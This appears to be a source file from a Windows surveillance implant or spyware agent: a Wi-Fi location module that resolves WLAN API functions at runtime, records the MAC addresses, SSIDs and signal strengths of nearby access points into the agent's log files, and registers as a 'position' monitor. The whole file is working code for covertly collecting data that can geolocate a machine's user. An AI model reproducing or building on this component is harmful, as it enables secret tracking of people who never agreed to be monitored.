#define TYPE_LOCATION_WIFI 3

typedef struct _wifiloc_param_struct {
	DWORD interval;
	DWORD unused;
} wifiloc_param_struct;

typedef struct _wifiloc_additionalheader_struct {
#define WIFI_HEADER_VERSION 2010082401
	DWORD version;
	DWORD type;
	DWORD number_of_items;
} wifiloc_additionalheader_struct;

typedef struct _wifiloc_data_struct {
    UCHAR MacAddress[6];    // BSSID
    UINT uSsidLen;          // SSID length
    UCHAR Ssid[32];         // SSID
    INT iRssi;              // Received signal 
} wifiloc_data_struct;

#include <wlanapi.h>
typedef DWORD (WINAPI *WlanOpenHandle_t) (DWORD, PVOID, PDWORD, PHANDLE);
typedef DWORD (WINAPI *WlanCloseHandle_t) (HANDLE, PVOID);
typedef DWORD (WINAPI *WlanEnumInterfaces_t) (HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST *);
typedef DWORD (WINAPI *WlanGetNetworkBssList_t) (HANDLE, const GUID *, const PDOT11_SSID, DOT11_BSS_TYPE, BOOL, PVOID, PWLAN_BSS_LIST *);
typedef DWORD (WINAPI *WlanFreeMemory_t) (PVOID);

WlanOpenHandle_t pWlanOpenHandle = NULL;
WlanCloseHandle_t pWlanCloseHandle = NULL;
WlanEnumInterfaces_t pWlanEnumInterfaces = NULL;
WlanGetNetworkBssList_t pWlanGetNetworkBssList = NULL;
WlanFreeMemory_t pWlanFreeMemory = NULL;

BOOL ResolveWLANAPISymbols()
{
	static HMODULE hwlanapi = NULL;

	if (!hwlanapi)
		hwlanapi = LoadLibrary("wlanapi.dll");
	if (!hwlanapi)
		return FALSE;

	if (!pWlanOpenHandle)
		pWlanOpenHandle = (WlanOpenHandle_t)HM_SafeGetProcAddress(hwlanapi, "WlanOpenHandle");

	if (!pWlanCloseHandle)
		pWlanCloseHandle = (WlanCloseHandle_t)HM_SafeGetProcAddress(hwlanapi, "WlanCloseHandle");

	if (!pWlanEnumInterfaces)
		pWlanEnumInterfaces = (WlanEnumInterfaces_t)HM_SafeGetProcAddress(hwlanapi, "WlanEnumInterfaces");

	if (!pWlanGetNetworkBssList)
		pWlanGetNetworkBssList = (WlanGetNetworkBssList_t)HM_SafeGetProcAddress(hwlanapi, "WlanGetNetworkBssList");

	if (!pWlanFreeMemory)
		pWlanFreeMemory = (WlanFreeMemory_t)HM_SafeGetProcAddress(hwlanapi, "WlanFreeMemory");

	if (pWlanOpenHandle && pWlanCloseHandle && pWlanEnumInterfaces && pWlanGetNetworkBssList && pWlanFreeMemory)
		return TRUE;

	return FALSE;
}

BOOL EnumWifiNetworks()
{
    HANDLE hClient = NULL, hf;
    DWORD dwMaxClient = 2;       
    DWORD dwCurVersion = 0;
	DWORD i, j;
	wifiloc_additionalheader_struct wifiloc_additionaheader;
	wifiloc_data_struct wifiloc_data;
    
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	PWLAN_BSS_LIST pBssList = NULL;
	PWLAN_BSS_ENTRY pBss = NULL;

	if (!ResolveWLANAPISymbols())
		return FALSE;
    
    if (pWlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS)  
		return FALSE;
    
    if (pWlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS)  {
		pWlanCloseHandle(hClient, NULL);
		return FALSE;
    }

	// Enumera le interfacce wifi disponibili
	for (i=0; i<pIfList->dwNumberOfItems; i++) {
		pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[i];

		if (pWlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid, NULL, dot11_BSS_type_infrastructure, FALSE, NULL, &pBssList) == ERROR_SUCCESS) {
			// Ha trovato un interfaccia valida ed enumera le reti wifi
			wifiloc_additionaheader.version = WIFI_HEADER_VERSION;
			wifiloc_additionaheader.type = TYPE_LOCATION_WIFI;
			wifiloc_additionaheader.number_of_items = pBssList->dwNumberOfItems;
			hf = Log_CreateFile(PM_WIFILOCATION, (BYTE *)&wifiloc_additionaheader, sizeof(wifiloc_additionaheader));
			for (j=0; j<pBssList->dwNumberOfItems; j++) {
				pBss = (WLAN_BSS_ENTRY *) &pBssList->wlanBssEntries[j];
			
				memcpy(wifiloc_data.MacAddress, pBss->dot11Bssid, 6);
				wifiloc_data.uSsidLen = pBss->dot11Ssid.uSSIDLength;
				if (wifiloc_data.uSsidLen>32)
					wifiloc_data.uSsidLen = 32; // limite massimo del SSID
				memcpy(wifiloc_data.Ssid, pBss->dot11Ssid.ucSSID, wifiloc_data.uSsidLen);
				wifiloc_data.iRssi = pBss->lRssi;
				Log_WriteFile(hf, (BYTE *)&wifiloc_data, sizeof(wifiloc_data));
			}
			Log_CloseFile(hf);
			break;
		} 
	}

	if (pBssList != NULL)
		pWlanFreeMemory(pBssList);
    if (pIfList != NULL) 
        pWlanFreeMemory(pIfList);
	pWlanCloseHandle(hClient, NULL);
    
    return TRUE;
}

DWORD __stdcall PM_WiFiLocationStartStop(BOOL bStartFlag, BOOL bReset)
{
	if (bStartFlag && bReset) 
		EnumWifiNetworks();
	return 1;
}


DWORD __stdcall PM_WiFiLocationInit(JSONObject elem)
{
	return 1;
}


void PM_WiFiLocationRegister()
{
	AM_MonitorRegister(L"position", PM_WIFILOCATION, NULL, (BYTE *)PM_WiFiLocationStartStop, (BYTE *)PM_WiFiLocationInit, NULL);
}